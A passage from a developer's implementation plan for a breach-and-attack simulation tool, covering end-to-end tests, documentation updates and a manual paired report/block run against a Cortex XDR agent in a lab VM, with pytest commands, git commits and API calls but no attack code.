- Produces three tests asserting, respectively: `subshell` → `step-02: signaled`, `step-03: not_run/UPSTREAM_SEVERED`, run `complete` (the fixture's step-02 carries a `prevent` expectation); `anchor` → `step-02: anchor_terminated`, same severing; `beacon` → after the sweep threshold the run is `complete` with `step-02: beacon_lost` and the BEACON LOST marker in output. All three assert that **no** Result reads `prevented` (no tenant witness in Tier-D) and the `prevent` Result is `pending` with its reason.

- [ ] **Step 1: Write the three failing tests and the harness flag**
- [ ] **Step 2: Run them against a local SimCore + docker**

Run: `.venv/bin/pytest tests/e2e_isolated/test_tier_d_prevention_witnesses.py -v` (with `CORTEXSIM_SERVER` pointing at a running dev SimCore built from this branch; otherwise they skip and the skip reason is printed)
Expected: PASS ×3 when the stack is up; SKIP ×3 otherwise

- [ ] **Step 3: Commit**

```bash
git add deploy/tier-d/run-tier-d.sh deploy/tier-d/classify.py deploy/tier-d/tier_c_assert.py tests/e2e_isolated/test_tier_d_prevention_witnesses.py
git commit -m "test(e2e): prove the three host witnesses end to end in Tier-D"
```

---

### Task 17: Docs and the non-UTC pass

**Files:**
- Modify: `docs/reference/api-and-agent-surface.md` (wire contract: `/complete.steps[]`, `required_binaries`, `/pair`, `/canary`, the termination vocabulary; fix lines 971-972: a missing binary returns `127`, not `-1`), `CLAUDE.md` (the *Measurement loop* paragraph gains two sentences: the outcome axis and the paired run, with `tenant-verified` prevention stated as 0 until Task 18 moves it), `.env.example` (the three new settings)
- Test: `make test-backend-non-utc`

- [ ] **Step 1: Update the three documents as listed**
- [ ] **Step 2: Run the full backend suite twice**

Run: `.venv/bin/pytest tests -q -x --ignore=tests/e2e_isolated` then `make test-backend-non-utc`
Expected: both green; the non-UTC pass is the one that catches a naive `attested_at` or `started_at` comparison in Tasks 4 and 12

- [ ] **Step 3: Commit**

```bash
git add docs/reference/api-and-agent-surface.md CLAUDE.md .env.example
git commit -m "docs: wire contract for step outcomes, pairing, canary; fix exit-127 drift"
```

---

### Task 18: The live paired run (manual, needs the lab)

This task cannot run in CI. It is the proof the phase exists for; record every output in `docs/superpowers/plans/2026-10-26-phase1-live-run-log.md` as it happens.

- [ ] **Step 1: Preconditions (Henry):** Linux VM with the host-installed Cortex XDR agent enrolled to `deathstar`, profile in **report** mode, BAS mode **enabled** on that agent, soakless set on the tenant; the `xsiam` reconcile credential configured in SimCore; beacon enrolled on the VM via the installer one-liner.
- [ ] **Step 2: Preflight.** `POST /api/connectors/xsiam/preflight` → `alert_shape.action` reports present. If absent, stop: spec §9's Phase 0 (the issues endpoint) comes first.
- [ ] **Step 3: Report run.** `POST /api/runs` with the fixture-derived prevention scenario (or the first Phase 3 scenario if it exists), `agent_profile_mode: "report"`, both attestations, `attested_by`. Wait for `complete`; `POST /api/runs/{id}/reconcile?connector=xsiam`; confirm every expectation `detected` and the `prevent` one carries `ATTESTATION_CONTRADICTED` **only if** the agent blocked anyway (then the profile was not report — fix and re-run).
- [ ] **Step 4: Flip the profile to block in the Cortex console.** `POST /api/runs/canary {target_agent_id}` → wait → confirm `block_mode_confirmed` (if `canary_not_available`, proceed attested-only and say so in the log).
- [ ] **Step 5: Block run.** `POST /api/runs` with `agent_profile_mode: "block"`, `paired_with_run_id: <report run>`, `canary_run_id`. Expect the run to end `complete` with `severed_at_step` set and the beacon still online (BAS mode). Reconcile. Expect the `prevent` Result `prevented` / `pass`, later steps `not_reached`.
- [ ] **Step 6: Readout.** `GET /api/runs/{block}/pair` and `GET /api/runs/{block}/report`. Paste the Prevention Delta and Chain Integrity sections into the log.
- [ ] **Step 7: Count.** Update `CLAUDE.md`'s `tenant-verified` statement for prevention from 0 to 1, citing the log; commit:

```bash
git add CLAUDE.md docs/superpowers/plans/2026-10-26-phase1-live-run-log.md
git commit -m "docs: first tenant-verified prevention — paired run on the Linux VM"
```
